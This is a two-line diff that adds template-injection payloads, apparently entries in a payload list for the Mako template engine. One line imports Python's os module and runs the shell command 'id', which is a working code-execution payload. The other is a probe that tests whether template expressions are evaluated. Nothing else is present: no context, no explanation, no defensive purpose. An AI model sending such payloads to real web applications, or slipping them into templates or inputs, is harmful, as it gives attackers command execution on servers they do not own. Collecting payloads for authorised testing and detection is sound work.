@@ -1,0 +1,2 @@
+<%import os;x=os.popen('id').read();%>${x}
+${"z".join("ab")}
